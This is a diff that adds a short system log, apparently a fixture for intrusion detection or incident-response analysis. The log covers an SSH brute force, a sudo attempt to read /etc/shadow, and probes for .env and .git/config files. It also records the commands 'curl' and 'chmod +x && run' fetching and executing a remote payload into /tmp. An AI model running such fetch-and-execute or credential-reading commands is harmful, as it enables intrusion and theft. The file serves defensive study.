@@ -1,0 +1,23 @@
+2026-05-08T03:14:01.012Z fw01 fwd: [INFO] keepalive ok peer=10.0.0.1
+2026-05-08T03:14:32.221Z auth-server sshd[8821]: Failed password for root from 203.0.113.42 port 51234 ssh2
+2026-05-08T03:14:33.114Z auth-server sshd[8822]: Failed password for root from 203.0.113.42 port 51235 ssh2
+2026-05-08T03:14:34.221Z auth-server sshd[8823]: Failed password for admin from 203.0.113.42 port 51236 ssh2
+2026-05-08T03:14:35.119Z auth-server sshd[8824]: Failed password for postgres from 203.0.113.42 port 51237 ssh2
+2026-05-08T03:14:36.221Z auth-server sshd[8825]: Failed password for ubuntu from 203.0.113.42 port 51238 ssh2
+2026-05-08T03:14:55.114Z fw01 fwd: [WARN] high connection rate src=203.0.113.42 to 10.0.0.10:22 conns=42/min
+2026-05-08T03:15:01.221Z auth-server sshd[8842]: Accepted publickey for deploy from 203.0.113.42 port 51299 ssh2
+2026-05-08T03:15:02.114Z auth-server sshd[8842]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+2026-05-08T03:15:08.991Z auth-server sudo[8851]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/cat /etc/shadow
+2026-05-08T03:15:09.402Z auth-server sudo[8851]: deploy : NOT in sudoers ; command attempt blocked
+2026-05-08T03:15:12.221Z auth-server bash[8841]: deploy : executed: curl -s http://203.0.113.99/payload.sh -o /tmp/.x
+2026-05-08T03:15:13.118Z auth-server bash[8841]: deploy : executed: chmod +x /tmp/.x && /tmp/.x &
+2026-05-08T03:15:14.221Z fw01 fwd: [WARN] outbound denied src=10.0.0.10 dst=203.0.113.99:80 (rule id=9001 outbound_whitelist)
+2026-05-08T03:15:15.992Z fw01 fwd: [WARN] outbound denied src=10.0.0.10 dst=185.220.101.45:4444 (rule id=9001) reason=non_whitelisted
+2026-05-08T03:15:17.221Z auth-server kernel: audit: type=1300 audit(1746674117.221:441): syscall=execve key="suspicious_exec" exe="/tmp/.x" euid=1001 uid=1001
+2026-05-08T03:15:18.402Z auth-server systemd-tmpfiles: SECURITY: world-writable file /tmp/.x detected with executable bit set
+2026-05-08T03:15:22.114Z app-server-1 myapp[3201]: [WARN] suspicious request: User-Agent="curl/8.0" path=/.env from 10.0.0.10
+2026-05-08T03:15:23.221Z app-server-1 myapp[3201]: [WARN] suspicious request: path=/.git/config from 10.0.0.10
+2026-05-08T03:15:33.991Z fw01 fwd: [WARN] outbound burst src=10.0.0.10 dst=185.220.101.0/24 attempts=78 denied=78 in 10s
+2026-05-08T03:15:45.221Z auth-server osquery: [ALERT] new persistence: cron job created /var/spool/cron/crontabs/deploy
+2026-05-08T03:15:50.114Z auth-server osquery: [ALERT] suid bit set on /tmp/.x by non-root user (uid=1001)
+2026-05-08T03:16:01.221Z fw01 fwd: [INFO] policy reload requested by admin user=ops01 (incident response)
